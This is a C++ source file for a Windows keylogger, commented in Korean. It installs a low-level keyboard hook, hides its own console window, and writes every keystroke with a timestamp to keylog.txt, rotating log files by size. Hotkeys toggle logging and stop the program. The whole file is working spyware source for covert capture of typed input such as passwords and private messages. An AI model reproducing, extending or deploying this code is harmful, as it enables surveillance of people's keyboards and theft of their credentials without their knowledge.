#include <windows.h>
#include <fstream>
#include <iostream>
#include <ctime>
#include <string>
#include <codecvt>
#include <locale>
#include "pch.h"

#define STR "keylog.txt"
#define LG std::ofstream

HHOOK hHook;
bool isLoggingEnabled = true;
const size_t MAX_FILE_SIZE = 1024 * 1024;

// std::wstring을 std::string으로 변환하는 함수
std::string wstringToString(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
    return converter.to_bytes(wstr);
}

// 현재 시간 정보를 문자열로 변환하여 반환
std::string GetTimestamp() {
    std::time_t now = std::time(nullptr);
    std::tm localTime;
    localtime_s(&localTime, &now);  // localtime_s로 변경하여 스레드 안전하게 사용

    char buffer[80];
    strftime(buffer, sizeof(buffer), "[%Y-%m-%d %H:%M:%S] ", &localTime);
    return buffer;
}

// 가상 키 코드를 문자열로 변환하는 함수
std::string GetKeyName(DWORD vkCode) {
    BYTE keyboardState[256];
    WCHAR buffer[5];

    if (GetKeyboardState(keyboardState)) {
        HKL layout = GetKeyboardLayout(0);
        int result = ToUnicodeEx(vkCode, MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout),
            keyboardState, buffer, 5, 0, layout);

        if (result > 0) {
            return wstringToString(std::wstring(buffer, result));
        }
    }

    switch (vkCode) {
    case VK_RETURN: return "[Enter]";
    case VK_BACK: return "[Backspace]";
    case VK_TAB: return "[Tab]";
    case VK_SHIFT: return "[Shift]";
    case VK_CONTROL: return "[Ctrl]";
    case VK_MENU: return "[Alt]";
    case VK_CAPITAL: return "[Caps Lock]";
    case VK_ESCAPE: return "[Esc]";
    case VK_SPACE: return " ";
    default:
        return "[Unknown Key]";
    }
}

// 로그 파일 크기 확인 및 파일 분할
void CheckLogFileSize() {
    std::ifstream file(STR, std::ios::binary | std::ios::ate);
    if (file.is_open() && file.tellg() >= MAX_FILE_SIZE) {
        file.close();

        std::time_t now = std::time(nullptr);
        std::tm localTime;
        localtime_s(&localTime, &now);  // localtime_s로 변경
        char buffer[80];
        strftime(buffer, sizeof(buffer), "keylog_%Y%m%d_%H%M%S.txt", &localTime);
        rename(STR, buffer);
    }
}

// 훅 프로시저 (키 입력을 가로채서 파일에 기록)
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && isLoggingEnabled) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) {
            CheckLogFileSize();
            LG log(STR, std::ios::app);
            if (log.is_open()) {
                log << GetTimestamp() << GetKeyName(pKeyboard->vkCode) << std::endl;
                log.close();
            }
        }
    }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000 &&
        GetAsyncKeyState(VK_SHIFT) & 0x8000 &&
        GetAsyncKeyState(0x51) & 0x8000) {
        PostQuitMessage(0);
    }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000 &&
        GetAsyncKeyState(VK_SHIFT) & 0x8000 &&
        GetAsyncKeyState(0x4C) & 0x8000) {
        isLoggingEnabled = !isLoggingEnabled;
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        std::cerr << "후킹 설치에 실패했습니다." << std::endl;
        return 1;
    }
    std::cout << "후킹이 시작되었습니다. 'keylog.txt' 파일에 기록됩니다." << std::endl;
    std::cout << "종료하려면 Ctrl+Shift+Q를 누르세요." << std::endl;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}